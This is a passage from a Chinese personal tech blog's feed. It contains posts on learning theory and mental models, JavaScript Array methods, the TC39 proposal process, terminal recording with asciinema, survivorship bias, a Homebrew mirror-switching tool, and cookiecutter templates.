title="怎么衡量这两个指标"></a>怎么衡量这两个指标</h3><ol><li><span class="highlight">流体智力</span> 即一般意义上的智商，决定了我们的计算速度、推理能力、短时记忆力，有生理基础的，成年之后慢慢下降。</li><li><span class="highlight">晶体智力</span> 是长时记忆中的优质的陈述性记忆，其核心是清晰、稳定、准确的 <span class="highlight">概念</span>。</li></ol><h2 id="学习理论"><a href="#学习理论" class="headerlink" title="学习理论"></a>学习理论</h2><blockquote><p>学生是否能习得新信息，主要取决于他们认知结构中已有的有关概念；意义学习是通过新信息与学生认知结构中已有的有关概念相互作用才得以发生。 —— 《意义学习新论》</p></blockquote><h3 id="学习的几个阶段"><a href="#学习的几个阶段" class="headerlink" title="学习的几个阶段"></a>学习的几个阶段</h3><p><span class="highlight">表征</span> 学习，从刺激到符号<br><span class="highlight">概念</span> 学习，从符号到类别<br><span class="highlight">命题</span> 学习，概念间关系<br><span class="highlight">理论</span> 学习，命题组成理论</p><p>最重要的事概念，因为表征太普遍了，只有概念才能让我们恰到好处的归纳和整理世界，它也是命题和理论的基础，概念的稳定性决定了整个思维框架的稳定性。</p><img src="/2020/02/17/043_Theory_of_mental_calculation/cognitive_structure.jpg"><p>教育心里学中有一个六阶段理论，其中有一个阶段 “新信息进入原有命题网络”，这就相当于第四个阶段。</p><h3 id="新概念与老概念的关系"><a href="#新概念与老概念的关系" class="headerlink" title="新概念与老概念的关系"></a>新概念与老概念的关系</h3><ol><li>下位关系，老概念囊括新概念，例如晶体智力就是对智力的修补。</li><li>上位关系，老概念支撑新概念的建立，例如苹果、菠萝、梨子和水果的概念。</li><li>并列关系，类比。</li></ol><h3 id="影响学习能力的因素"><a href="#影响学习能力的因素" class="headerlink" title="影响学习能力的因素"></a>影响学习能力的因素</h3><p>关键性概念的稳定性和清晰度决定了学习能力。现在的很多概念都是被严重污染过的，在这些幽灵概念和现有概念发生关系之前，他们就是垃圾，是跑龙套的演员。</p><h2 id="多元思维理论"><a href="#多元思维理论" class="headerlink" title="多元思维理论"></a>多元思维理论</h2><p>思维模型的本质是由特定的概念、命题和理论所构成的长时的陈述性记忆。</p><img src="/2020/02/17/043_Theory_of_mental_calculation/model.jpg"><p>什么是多元呢？多元指的是你有足够多的健壮的、清晰的、稳定的由各类概念明天和理论所构成的陈述性记忆，他们能从不同的角度让你分层次地去把把握和理解这个世界的规律，这就是晶体智力的内涵。同一个现象你看起来像不知所云，但是透过某种理论的晶体看起就是规律。所以，与其说一个人看待问题的视角很特别，不如说他记住了足够多的概念和命题来陈述这件事情。那么怎么能够记住呢？</p><h3 id="刻意练习"><a href="#刻意练习" class="headerlink" title="刻意练习"></a>刻意练习</h3><p>《刻意练习》是安德斯·埃里克森提出的概念。它里面特意提到，刻意练习的关键就是要创建特定的心里表征，这些表征是信息预先存在的模式，这些模式保存在长时记忆中，可以用于有效且快速的顺应某些类型的局面，对于所有心理表征有一点是相同的，尽管短时记忆存在局限，但他们使得人们可以迅速地处理大量的信息。事实上人们可以把心理表征定义为一个“概念式的结构设计”，用于回避短时记忆的局限。一言以蔽之，刻意练习就是把这些东西放进长时记忆的一个动作，并且让长时记忆能够迅速地拉回工作记忆。具体应该怎么做呢？</p><ol><li>明确任务的输入和输出（决定稳定性）</li><li>用大量例子重塑大脑连接（决定清晰度）</li></ol><p>再回到开头提到的学习的本质。”学习是一个系统为了适应环境而形成的一种长久的变化，通过这种长久的变化系统能够在下一次更有效的完成「同类」的工作“。为什么高手总是能举一反三、触类旁通？因为他脑子里的关键理论的晶体都是粗壮的大逻辑，所以总是能够找到共性和规律。</p><h3 id="对比反馈"><a href="#对比反馈" class="headerlink" title="对比反馈"></a>对比反馈</h3><p>”对比反馈“是最好的学习方法之一。它的核心原理就在于通过对比，你让80%的东西变得不重要了，最大体量的那个东西变得不重要了，剩下的20%的差距马上就出来了，因为简单的东西是不重要的，但是它很惹眼。复杂的东西是很细微的，但是它很重要，你让细微的东西体现出来之后，你就练细微的东西，练这20%。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Methodology" scheme="https://vincentstudio.info/categories/Methodology/"/>
    
    
      <category term="Thoughts" scheme="https://vincentstudio.info/tags/Thoughts/"/>
    
  </entry>
  
  <entry>
    <title>Javascript Array 方法总结</title>
    <link href="https://vincentstudio.info/2020/02/12/042_Javascript_Array/"/>
    <id>https://vincentstudio.info/2020/02/12/042_Javascript_Array/</id>
    <published>2020-02-12T02:00:16.000Z</published>
    <updated>2020-02-22T05:08:04.519Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="堆栈-amp-队列"><a href="#堆栈-amp-队列" class="headerlink" title="堆栈 &amp; 队列"></a>堆栈 &amp; 队列</h2><ul><li><span class="highlight">push</span> 添加到末尾，返回修改后的长度</li><li><span class="highlight">pop</span> 移除最后一项，返回移除的项</li><li><span class="highlight">unshift</span> 添加到前端，返回修改后的长度</li><li><span class="highlight">shift</span> 移除第一项，取得数组第一项</li></ul><p><code>push</code> 和 <code>unshift</code> 支持插入多个元素，如下</p><pre><code class="lang-javascript">arr.push(1, 2, 3);arr.unshift(1, 2, 3);</code></pre><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><ul><li><span class="highlight">indexOf</span> 传入 <code>value</code>，返回 <code>index | -1</code></li><li><span class="highlight">includes</span> 传入 <code>value</code>，返回 <code>boolean</code></li><li><span class="highlight">findIndex</span> 传入 <code>function</code>，返回 <code>index | -1</code></li><li><span class="highlight">find</span> 传入 <code>function</code>，返回 <code>value | undefined</code></li></ul><h2 id="重排序"><a href="#重排序" class="headerlink" title="重排序"></a>重排序</h2><ul><li><span class="highlight">reverse</span> 反转数组，返回反转后的数组</li><li><span class="highlight">sort</span> 默认按升序排列, 返回排序后的数组</li></ul><p><code>cmp</code> 函数返回值 &lt; 0 靠前，&gt; 0 靠后</p><pre><code class="lang-javascript">[2, 1, 3].sort((a, b) =&gt; a - b); // @return: [1, 2, 3] 等价于 [2,1,3].sort()[{v:2}, {v:1}, {v:3}].sort((a, b) =&gt; b.v - a.v); // @return: [{v:2}, {v:1}, {v:1}]</code></pre><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><ul><li><span class="highlight">slice</span> 返回新数组，可用值拷贝 <code>slice(0)</code><ul><li><code>slice (start, end)</code>: 返回 <code>start</code> 到 <code>end</code> 位置的项（不包括结束位置）</li><li><code>slice (start)</code> <code>start</code>: 位置到末尾的所有项</li></ul></li><li><span class="highlight">splice</span> 返回被删除的项<ul><li><code>splice (start, count)</code>: 从 <code>start</code> 位置开始删除 <code>count</code> 个项</li><li><code>splice (start, 0, ...inserts)</code>: 从 <code>start</code> 位置开始插入 <code>inserts</code></li><li><code>splice (start, count, ...inserts)</code>: 先删再插</li></ul></li></ul><p>注意，<code>slice</code> 返回新数组而原数组不变，而 <code>splice</code> 返回被删除的数组，原数组也会改变。<code>slice</code> 相当于 <code>python</code> 里切片语法，例如 <code>arr[1:3]</code>, <code>arr[-2]</code> 等价于 <code>arr.slice(1, 3)</code>, <code>arr.slice(-2)</code>。</p><pre><code class="lang-javascript">const a = [1, 2, 3];const b = a.slice(-2);// b: [2, 3] 最后2个元素 // a: [1, 2, 3]const c = a.splice(1, 0, 6, 7);// c: [] 没有删除值// a: [1, 6, 7, 2, 3]</code></pre><h2 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h2><ul><li><span class="highlight">every</span> 每一项返回 <code>true</code> 则返回 <code>ture</code></li><li><span class="highlight">some</span> 任意一项返回 <code>true</code> 则返回 <code>ture</code></li><li><span class="highlight">filter</span> 返回返回 <code>true</code> 的数组</li><li><span class="highlight">map</span> 返回每次函数调用的结果组成的数组</li><li><span class="highlight">forEach</span> 没有返回值, 与 <code>for</code> 类似</li></ul><p>回调参数都是 (item[, index[, array]]), <code>forEach</code> 和 <code>map</code> 执行过程中无法通过 <code>break</code> 或 <code>return</code> 中断，一旦执行就必须执行到末尾，如果需要截断，可以用 <code>some</code> 代替，中断时返回 <code>true</code> 即可。</p><pre><code class="lang-javascript">const a = [1, 2, 3, 6, 4, 5];const b = a.filter(item =&gt; item &lt; 5);// b: [1, 2, 3, 4] 返回小于5的结果// a: [1, 6, 7, 2, 3] 原数组不变const c = a.some(item =&gt; {    console.log(item);    return item &gt; 4;})// log: 1, 2, 3, 6 找到 6 时返回 true，中断循环// c: true 找到结果</code></pre><h2 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h2><ul><li><span class="highlight">reduce</span> 累积所有，返回累积的结果</li><li><span class="highlight">reduceRight</span> 从后向前累积</li></ul><p>arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])</p><pre><code class="lang-javascript">const arr = [{ n: 1 }, { n: 2 }, { n: 3  }];const data = { v: 2, sum: 0 };arr.reduce((acc, cur) =&gt; (acc.sum += cur.n, acc), data);// return: { v: 2, sum: 6 }</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array - Javascript | MDN</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincentstudio.info/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincentstudio.info/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>TC39 与 ECMAScript 提案</title>
    <link href="https://vincentstudio.info/2020/02/09/041_TC39_and_ECMAScript/"/>
    <id>https://vincentstudio.info/2020/02/09/041_TC39_and_ECMAScript/</id>
    <published>2020-02-09T08:14:00.000Z</published>
    <updated>2020-02-12T02:16:58.428Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="TC39-是什么？"><a href="#TC39-是什么？" class="headerlink" title="TC39 是什么？"></a>TC39 是什么？</h2><p>TC39 全称 Ecma International, Technical Committee 39（ECMA国际技术委员会39)，是制定 ECMA-262 号标准制的组织，由各个主流浏览器厂商的代表构成。</p><p>可能有些小伙伴会有点懵逼，Ecma International 是什么？TC39 为啥是39，而不是 TC38，39代表着什么？ECMA-262 又是啥，它跟 ECMAScript 又有什么关系？ECMAScript 跟 Javascript 又有什么关系？下面我就来整理了一下。</p><h2 id="Ecma-International"><a href="#Ecma-International" class="headerlink" title="Ecma International"></a>Ecma International</h2><p>以下摘自维基百科：</p><blockquote><p>Ecma国际（英语：Ecma International）是一家国际性会员制度的信息和电信标准组织。1994年之前，名为欧洲计算机制造商协会（European Computer Manufacturers Association）。因为计算机的国际化，组织的标准牵涉到很多其他国家，因此组织决定改名表明其国际性。现名称已不属于首字母缩略字。<br><br>组织在1961年的日内瓦创建为了标准化欧洲的计算机系统。在欧洲制造、销售或开发计算机和电信系统的公司都可以申请成为会员。</p></blockquote><p>由此我们知道，Ecma国际是1961年成立的一家制定计算机标准的机构。</p><h2 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h2><p>ECMAScript 是一种由Ecma国际在标准 ECMA-262 中定义的脚本语言规范。和 ECMAScript 有关的标准还有 ECMA-262，ECMA-290，ECMA-327，ECMA-357，ECMA-402，ECMA-404，ECMA-414等等。其中 ECMA-290，ECMA-327，ECMA-357 等没有推广开来，被废弃。</p><h3 id="相关标准"><a href="#相关标准" class="headerlink" title="相关标准"></a>相关标准</h3><ul><li><code>ECMA-262</code>：ECMAScript 语言规范本身</li><li><code>ECMA-402</code>：基于 ECMAScript 5 或者之后版本的一些国际化 API 标准</li><li><code>ECMA-404</code>：JSON 规范</li><li><code>ECMA-414</code>：规定了哪些规范是和 ECMAScript 有关的。目前内部就包含了 262，402 和 404</li></ul><h3 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h3><div class="table-container"><table><thead><tr><th>Ver.</th><th>Date</th><th>Difference</th></tr></thead><tbody><tr><td>1.0</td><td>1997/06</td><td>首版</td></tr><tr><td>2.0</td><td>1998/06</td><td>格式修正，以使得其形式与ISO/IEC16262国际标准一致</td></tr><tr><td>3.0</td><td>1999/12</td><td>强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变</td></tr><tr><td>4.0</td><td>放弃</td><td>由于关于语言的复杂性出现分歧，第4版本被放弃，其中的部分成为了第5版本及Harmony的基础</td></tr><tr><td>5.0</td><td>2009/12</td><td>新增“严格模式（strict mode）”，一个子集用作提供更彻底的错误检查,以避免结构出错。澄清了许多第3版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如getters及setters，支持JSON以及在对象属性上更完整的反射</td></tr><tr><td>5.1</td><td>2011/06</td><td>ECMAScript标5.1版形式上完全一致于国际标准ISO/IEC 16262:2011</td></tr><tr><td>6.0</td><td>2015/06</td><td>ECMAScript 2015（ES2015），第 6 版，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，其他特性包括迭代器，Python风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。作为最早的 ECMAScript Harmony 版本，也被叫做ES6 Harmony</td></tr><tr><td>7.0</td><td>2016/06</td><td>ECMAScript 2016（ES2016），第 7 版，多个新的概念和语言特性</td></tr><tr><td>8.0</td><td>2017/06</td><td>ECMAScript 2017（ES2017），第 8 版，多个新的概念和语言特性</td></tr><tr><td>9.0</td><td>2018/06</td><td>ECMAScript 2018 （ES2018），第 9 版，包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法</td></tr><tr><td>10.0</td><td>2019/06</td><td>ECMAScript 2019 （ES2019），第 10 版</td></tr></tbody></table></div><h2 id="TC39-Process"><a href="#TC39-Process" class="headerlink" title="TC39 Process"></a>TC39 Process</h2><p>每一项新特性，要最终纳入 ECMAScript 规范中，TC39 拟定了一个处理过程，称为 TC39 Process，其中共包含5个阶段。</p><h3 id="Stage-0-Strawman（稻草人阶段）"><a href="#Stage-0-Strawman（稻草人阶段）" class="headerlink" title="Stage 0: Strawman（稻草人阶段）"></a>Stage 0: Strawman（稻草人阶段）</h3><p>一种推进ECMAScript发展的自由形式，任何TC39成员，或者注册为TC39贡献者的会员，都可以提交。</p><h3 id="Stage-1-Proposal（提案阶段）"><a href="#Stage-1-Proposal（提案阶段）" class="headerlink" title="Stage 1: Proposal（提案阶段）"></a>Stage 1: Proposal（提案阶段）</h3><p>该阶段产生一个正式的提案。</p><ul><li>确定一个带头人来负责该提案，带头人或者联合带头人必须是TC39的成员。</li><li>描述清楚要解决的问题，解决方案中必须包含例子，API以及关于相关的语义和算法。</li><li>潜在问题也应该指出来，例如与其他特性的关系，实现它所面临的挑战。</li><li>polyfill和demo也是必要的。</li></ul><h3 id="Stage-2-Draft（草案阶段）"><a href="#Stage-2-Draft（草案阶段）" class="headerlink" title="Stage 2: Draft（草案阶段）"></a>Stage 2: Draft（草案阶段）</h3><p>草案是规范的第一个版本，与最终标准中包含的特性不会有太大差别。草案之后，原则上只接受增量修改。</p><ul><li>草案中包含新增特性语法和语义的，尽可能的完善的形式说明，允许包含一些待办事项或者占位符。</li><li>必须包含2个实验性的具体实现，其中一个可以是用转译器实现的，例如Babel。</li></ul><h3 id="Stage-3-Candidate（候选阶段）"><a href="#Stage-3-Candidate（候选阶段）" class="headerlink" title="Stage 3: Candidate（候选阶段）"></a>Stage 3: Candidate（候选阶段）</h3><p>候选阶段，获得具体实现和用户的反馈。此后，只有在实现和使用过程中出现了重大问题才会修改。</p><ul><li>规范文档必须是完整的，评审人和ECMAScript的编辑要在规范上签字。</li><li>至少要有两个符合规范的具体实现。</li></ul><h3 id="Stage-4-Finished（完成阶段）"><a href="#Stage-4-Finished（完成阶段）" class="headerlink" title="Stage 4: Finished（完成阶段）"></a>Stage 4: Finished（完成阶段）</h3><p>已经准备就绪，该特性会出现在年度发布的规范之中。</p><ul><li>通过 Test-262 的验收测试。</li><li>有2个通过测试的实现，以获取使用过程中的重要实践经验。</li><li>ECMAScript的编辑必须规范上的签字。</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/tc39" target="_blank" rel="noopener">Github of TC39</a></li><li><a href="https://www.ecma-international.org/memento/tc39-rf-tg.htm" target="_blank" rel="noopener">Website of TC39</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincentstudio.info/tags/FrontEnd/"/>
    
  </entry>
  
  <entry>
    <title>Shell录屏工具 asciinema 介绍</title>
    <link href="https://vincentstudio.info/2020/01/31/040_How_to_record_the_screen_of_terminal/"/>
    <id>https://vincentstudio.info/2020/01/31/040_How_to_record_the_screen_of_terminal/</id>
    <published>2020-01-31T03:15:00.000Z</published>
    <updated>2020-01-31T06:23:11.421Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><img src="/2020/01/31/040_How_to_record_the_screen_of_terminal/demo.gif"><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul><li><a href="https://github.com/asciinema/asciinema" target="_blank" rel="noopener"><code>asciinema</code></a> 录屏工具，输出 <code>json</code></li><li><a href="https://github.com/asciinema/asciicast2gif" target="_blank" rel="noopener"><code>asciicast2gif</code></a> 格式转换工具 <code>json</code> 转 <code>gif</code></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="asciinema-录屏工具"><a href="#asciinema-录屏工具" class="headerlink" title="asciinema 录屏工具"></a><code>asciinema</code> 录屏工具</h3><pre><code>$ brew install asciinema</code></pre><h3 id="asciicast2gif-格式转换工具"><a href="#asciicast2gif-格式转换工具" class="headerlink" title="asciicast2gif 格式转换工具"></a><code>asciicast2gif</code> 格式转换工具</h3><ul><li><a href="https://repo.huaweicloud.com/java/jdk/8u192-b12/jdk-8u192-macosx-x64.dmg" target="_blank" rel="noopener">jdk 下载安装</a></li></ul><pre><code># 安装依赖$ brew install ImageMagick gifsicle leiningen# 下载源码$ git clone --recursive https://github.com/asciinema/asciicast2gif.git# 安装依赖$ cd asciicast2gif &amp;&amp; npm i# 编译得到 ./asciicast2gif$ lein cljsbuild once main &amp;&amp; lein cljsbuild once page # 添加环境变量 (替换 /path/to/)$ export PATH=&quot;$PATH:/path/to/asciicast2gif&quot;</code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="录屏输出-json"><a href="#录屏输出-json" class="headerlink" title="录屏输出 json"></a>录屏输出 json</h3><pre><code class="lang-bash"># 开始录屏$ asciinema rec# asciinema: recording asciicast to tmpj6mmcek_-ascii.cast# asciinema: press &lt;ctrl-d&gt; or type &quot;exit&quot; when you&#39;re done# 结束录屏 CTRL + D# asciinema: recording finished# asciinema: press &lt;enter&gt; to upload to asciinema.org, &lt;ctrl-c&gt; to save locally# asciinema: asciicast saved to tmpj6mmcek_-ascii.cast</code></pre><h3 id="json-转-gif"><a href="#json-转-gif" class="headerlink" title="json 转 gif"></a>json 转 gif</h3><pre><code class="lang-bash">$ ./asciicast2gif tmpj6mmcek_-ascii.cast demo.gif# ==&gt; Loading tmpj6mmcek_.cast...# ==&gt; Spawning PhantomJS renderer...# ==&gt; Generating frame screenshots...# ==&gt; Combining 5 screenshots into GIF file...# ==&gt; Done.</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Shell" scheme="https://vincentstudio.info/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>幸存者偏差 (Survivorship bias)</title>
    <link href="https://vincentstudio.info/2020/01/30/039_Survivorship_bias/"/>
    <id>https://vincentstudio.info/2020/01/30/039_Survivorship_bias/</id>
    <published>2020-01-30T12:20:00.000Z</published>
    <updated>2020-01-30T08:31:57.724Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>世界的关注点永远在那些偶然的成功者身上，却忽略了上万倍没被概率选中的失败者。</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>幸存者偏差，另译为 “生存者偏差” 或 “生存偏见”，是一种常见的逻辑谬误（“谬误”而不是“偏差”），意思是只能看到经过某种筛选而产生的结果，而没有意识到筛选的过程，因此忽略了被筛选掉的关键信息。</p><h2 id="军事中的案例"><a href="#军事中的案例" class="headerlink" title="军事中的案例"></a>军事中的案例</h2><p>第二次世界大战期间的1941年，美国哥伦比亚大学统计学亚伯拉罕·沃德教授接受美国海军要求，运用他在统计方面的专业知识给出关于“飞机应该如何加强防护，才能降低被炮火击落的几率”的建议。沃德教授针对盟军的轰炸机遭受攻击后的相关数据，进行分析和研究后发现：机翼是整个飞机中最容易遭受攻击的位置，但是发动机则是最少被攻击的位置。因此沃德教授给出的结论是“我们应该强化发动机的防护”，但是美国海军指挥官认为“应该加强机翼的防护，因为这是最容易被击中的位置”。</p><img src="/2020/01/30/039_Survivorship_bias/plane.png"><p>沃德教授提出以下其加强机身防护意见的依据：</p><ul><li>本次统计的样本，仅包含没有因敌火射击而坠毁并安全返航的轰炸机。</li><li>沃德教授假设所有中弹的弹著点应该会平均分布在机身各处，而能安全返航的轰炸机机身中弹数量较多的区域，是即使被击中也比较不会导致坠机的部位。</li><li>机翼被击中很多次的轰炸机，大多数仍然能够安全返航。</li><li>发动机弹孔较少的原因并非真的不容易中弹，而是一旦中弹，其安全返航并生还的可能性就微乎其微。</li></ul><p>军方最终采取了教授提出的增加发动机防护的建议，后来证实该决策是完全正确的。这项研究对当时仍在发展初期的作业研究领域具有深远的影响。</p><h2 id="其他案例收集"><a href="#其他案例收集" class="headerlink" title="其他案例收集"></a>其他案例收集</h2><ul><li>有人把一幅画给一位无神论者看，画上画着一群正在祈祷拜神的人，并告诉他，这些人在随后的沉船事故中都活了下来。无神论者淡淡一问：“我想看看那些祈祷完被淹死的人的画像在哪儿？死人又不会说话。“</li><li>成功人士乔布斯和比尔盖茨都辍学了，所以要想成功就必须要辍学。其谬误在于没有看到辍学而没有成功的人占绝大多数。</li><li>如果只看 <code>NBA</code> 球员，会发现身高比较高的人得分率没有身高较低的人高。这是因为身高矮还能进 NBA 的人必然是用其他优势补足了身高的弱势。</li><li>任贤齐，当年凭借一首“心太软”开始红遍大江南北。据他本人透露，当年有几十首作品寄给了唱片公司，《心太软》也是其中之一。唱片公司在审核的时候，本来已经将这首歌“丢进垃圾桶”，但由于最后没有找到心仪的歌曲，就在回去翻找的时候翻出了这首“遗珠”，连他们自己都想不到，最后竟然会如此之火。然而有成百上千的“任贤齐”现在早已远离“歌手”这个职业，他们可能正开着一家小店，也可能正在工地搬砖。在大多数情况下，就算你再有天赋再努力，你的作品也不会刚好被往回找遗珠的唱片公司所青睐。</li><li>读书无用论</li></ul><h2 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h2><ol><li>意识到 “沉默证据” 的存在。</li><li>找到不同类型、不同层次的 “沉默证据”</li><li>尝试排除“随机性”</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Methodology" scheme="https://vincentstudio.info/categories/Methodology/"/>
    
    
      <category term="Thoughts" scheme="https://vincentstudio.info/tags/Thoughts/"/>
    
  </entry>
  
  <entry>
    <title>BRM - Homebrew 仓库管理工具</title>
    <link href="https://vincentstudio.info/2020/01/29/038_Homebrew_registry_manager/"/>
    <id>https://vincentstudio.info/2020/01/29/038_Homebrew_registry_manager/</id>
    <published>2020-01-29T12:20:00.000Z</published>
    <updated>2020-01-30T14:23:54.051Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><a href="https://github.com/Vincent0700/homebrew-brm" target="_blank" rel="noopener"><code>BRM (Homebrew Registry Manager)</code></a> 是 <code>macOS</code> 包管理器 <code>Homebrew</code> 的仓库管理工具，它可以检测距你延迟最低的镜像站并快速切换，目前支持官方(<code>github</code>)源、清华源、阿里源、中科大源.</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>$ npm install -g homebrew-brm</code></pre><p>Or</p><pre><code>$ yarn global add homebrew-brm</code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><pre><code>$ brm -hUsage: brm [options] [command]Homebrew registry manager for macOSOptions:  -V, --version    output the version number  -h, --help       output usage informationCommands:  ls               List all the registries  current          Show current registry and URL  use &lt;registry&gt;   Change homebrew registry  test [registry]  Show response time for specific or all registries</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><img src="/2020/01/29/038_Homebrew_registry_manager/demo.gif"><h3 id="展示可用的仓库列表"><a href="#展示可用的仓库列表" class="headerlink" title="展示可用的仓库列表"></a>展示可用的仓库列表</h3><img src="/2020/01/29/038_Homebrew_registry_manager/list.jpg"><h3 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h3><img src="/2020/01/29/038_Homebrew_registry_manager/use.jpg"><h3 id="展示当前使用的仓库信息"><a href="#展示当前使用的仓库信息" class="headerlink" title="展示当前使用的仓库信息"></a>展示当前使用的仓库信息</h3><img src="/2020/01/29/038_Homebrew_registry_manager/current.jpg"><h3 id="自动安装环境依赖-homebrew-git"><a href="#自动安装环境依赖-homebrew-git" class="headerlink" title="自动安装环境依赖 (homebrew, git)"></a>自动安装环境依赖 (homebrew, git)</h3><img src="/2020/01/29/038_Homebrew_registry_manager/auto_install.jpg"><h3 id="测试镜像站速度，延迟从小到大排序"><a href="#测试镜像站速度，延迟从小到大排序" class="headerlink" title="测试镜像站速度，延迟从小到大排序"></a>测试镜像站速度，延迟从小到大排序</h3><img src="/2020/01/29/038_Homebrew_registry_manager/speed.jpg"><h2 id="仓库地址"><a href="#仓库地址" class="headerlink" title="仓库地址"></a>仓库地址</h2><p><a href="https://github.com/Vincent0700/homebrew-brm" target="_blank" rel="noopener">https://github.com/Vincent0700/homebrew-brm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Shell" scheme="https://vincentstudio.info/tags/Shell/"/>
    
      <category term="Javascript" scheme="https://vincentstudio.info/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>使用 cookiecutter 搭建起手模板</title>
    <link href="https://vincentstudio.info/2020/01/22/037_Usage_of_cookiecutter/"/>
    <id>https://vincentstudio.info/2020/01/22/037_Usage_of_cookiecutter/</id>
    <published>2020-01-22T09:08:00.000Z</published>
    <updated>2020-01-30T08:31:10.926Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><code>cookiecutter</code> 是我之前在写 <code>flask</code> 项目时发现的一个项目构建工具，<a href="https://github.com/cookiecutter/cookiecutter" target="_blank" rel="noopener">传送门</a>。本来这是一个 <code>python</code> 项目的 <code>wizard</code> 工具，现想引入到 <code>js</code> 项目中来作为个人定制化起手模板的构建工具。工具本身使用起来也是非常简单，详细说明参考 <a href="https://s0cookiecutter0readthedocs0io.icopy.site/en/latest/usage.html" target="_blank" rel="noopener">官方文档</a>。</p></blockquote><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>自己写了一个简单的 <span class="highlight">Javascript</span> 项目模板，<a href="https://github.com/Vincent0700/cookiecutter-js" target="_blank" 